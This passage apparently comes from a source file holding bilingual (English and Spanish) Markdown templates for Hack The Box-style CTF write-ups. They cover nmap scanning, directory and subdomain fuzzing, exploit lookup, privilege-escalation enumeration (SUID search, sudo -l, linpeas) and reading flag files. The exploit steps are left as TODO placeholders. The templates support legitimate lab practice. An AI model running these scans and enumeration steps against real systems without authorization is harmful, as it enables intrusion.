### Initial Access & Analysis
- **URL:** \`http://[TODO: machine.htb]\`
- **Useful Commands:**
  \`\`\`bash
  # Check DNS
  host [TODO: machine.htb]
  dig [TODO: machine.htb]
  
  # Check headers
  curl -I http://[TODO: machine.htb]
  
  # Web technology identification
  whatweb -a3 -v http://[TODO: machine.htb]
  
  # Check common ports
  netcat -vz [TODO: machine.htb] 1-1000
  \`\`\`

### Directory Fuzzing
\`\`\`bash
# Using dirsearch
dirsearch -u http://[TODO: machine.htb] -x 403,404

# Using gobuster
gobuster dir -u http://[TODO: machine.htb] -w /usr/share/wordlists/dirb/common.txt

# Using ffuf
ffuf -u http://[TODO: machine.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Found directories: [TODO: List found directories like /about.php, /contact.php]*

### Subdomain Enumeration (VHosts)
Check for different response sizes to identify potential virtual hosts.
\`\`\`bash
# Fuzz for subdomains using ffuf and filter by response size
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: machine.htb]/ -H 'Host: FUZZ.[TODO: machine.htb]' -fs [TODO: base_response_size]
\`\`\`
*Found subdomain: [TODO: e.g., grafana.planning.htb]. Added to /etc/hosts.*

---

## Exploitation

### Vulnerability Research
*Identified Service/Version: [TODO: e.g., Grafana v11.0.0]*
- Searched for exploits on:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Selected Exploit:** [TODO: Describe the selected exploit and its reference URL]

### Exploit Execution
[TODO: Step-by-step description of how the exploit was executed to gain initial access.]

---

## Initial Access
- **User:** \`whoami\` -> [TODO: user]
- **Environment:** \`uname -a\`, \`id\`, \`sudo -l\`

### User Flag
- **Command:** \`cat /home/[TODO: user]/user.txt\`

---

## Privilege Escalation

### Enumeration
- **Check sudo permissions:** \`sudo -l\`
- **Find SUID/GUID files:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Check running services:** \`ss -tuln\`
- **Automated enumeration scripts:** \`linpeas.sh\`, \`pspy\`

### Applied Technique
[TODO: Describe the technique used: SUID binary, misconfigured cronjob, hardcoded credentials, etc.]

---

## 👑 Root Flag
- **Command:** \`cat /root/root.txt\`
`,
    scope_es: `## Información General
- **Nombre de la máquina:** [TODO: Nombre de la máquina]
- **Dirección IP:** [TODO: Dirección IP]
- **Sistema Operativo:** Linux
- **Dificultad:** [TODO: Seleccionar Dificultad]
- **Fecha:** ${format(new Date(), 'dd-MM-yyyy')}

---

## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "[TODO: Dirección IP] [TODO: maquina.htb]" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Escaneo Simple
\`\`\`bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn [TODO: Dirección IP]
\`\`\`

#### Escaneo Avanzado
\`\`\`bash
sudo nmap -sCV -p22,80 [TODO: Dirección IP] -oN targeted
\`\`\`
*Resultado: Se encontraron los puertos 22 (SSH) y 80 (HTTP) abiertos.*

---

## Enumeración Web

### Acceso y Análisis Inicial
- **URL:** \`http://[TODO: maquina.htb]\`
- **Comandos útiles:**
  \`\`\`bash
  # Comprobar DNS
  host [TODO: maquina.htb]
  dig [TODO: maquina.htb]
  
  # Comprobar cabeceras
  curl -I http://[TODO: maquina.htb]
  
  # Identificación de tecnología web
  whatweb -a3 -v http://[TODO: maquina.htb]
  
  # Comprobar puertos comunes
  netcat -vz [TODO: maquina.htb] 1-1000
  \`\`\`

### Fuzzing de Directorios
\`\`\`bash
# Usando dirsearch
dirsearch -u http://[TODO: maquina.htb] -x 403,404

# Usando gobuster
gobuster dir -u http://[TODO: maquina.htb] -w /usr/share/wordlists/dirb/common.txt

# Usando ffuf
ffuf -u http://[TODO: maquina.htb]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
\`\`\`
*Directorios encontrados: [TODO: Listar directorios como /about.php, /contact.php]*

### Enumeración de Subdominios (VHosts)
Comprobar diferentes tamaños de respuesta para identificar posibles hosts virtuales.
\`\`\`bash
# Fuzzing de subdominios con ffuf y filtrado por tamaño de respuesta
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://[TODO: maquina.htb]/ -H 'Host: FUZZ.[TODO: maquina.htb]' -fs [TODO: tamaño_respuesta_base]
\`\`\`
*Subdominio encontrado: [TODO: p.ej., grafana.planning.htb]. Añadido a /etc/hosts.*

---

## Explotación

### Investigación de Vulnerabilidades
*Servicio/Versión Identificado: [TODO: p.ej., Grafana v11.0.0]*
- Búsqueda de exploits en:
  - https://exploit-db.com
  - https://sploitus.com
  - GitHub
- **Exploit Seleccionado:** [TODO: Describir el exploit usado y su URL de referencia]

### Ejecución del Exploit
[TODO: Descripción paso a paso de cómo se ejecutó el exploit para obtener acceso inicial.]

---

## Acceso Inicial
- **Usuario:** \`whoami\` -> [TODO: usuario]
- **Entorno:** \`uname -a\`, \`id\`, \`sudo -l\`

### Bandera de Usuario (User Flag)
- **Comando:** \`cat /home/[TODO: usuario]/user.txt\`

---

## Escalada de Privilegios

### Enumeración
- **Comprobar permisos de sudo:** \`sudo -l\`
- **Buscar archivos SUID/GUID:**
  \`\`\`bash
  find / -user root -perm -4000 -print 2>/dev/null
  \`\`\`
- **Ver servicios en ejecución:** \`ss -tuln\`
- **Scripts de enumeración automatizada:** \`linpeas.sh\`, \`pspy\`

### Técnica Aplicada
[TODO: Describir la técnica usada: binario SUID, cronjob mal configurado, credenciales hardcoded, etc.]

---

## 👑 Root Flag
- **Comando:** \`cat /root/root.txt\`
`,
    appendix_en: `### Appendix
- **Network Scanner:** Nmap
- **Web Fuzzer:** ffuf, dirsearch
- **Exploitation:** [TODO: e.g., Metasploit, Python script]
- **Privilege Escalation:** linpeas.sh`,
    appendix_es: `### Apéndice
- **Escáner de Red:** Nmap
- **Fuzzer Web:** ffuf, dirsearch
- **Explotación:** [TODO: p. ej., Metasploit, script de Python]
- **Escalada de Privilegios:** linpeas.sh`
  },
];
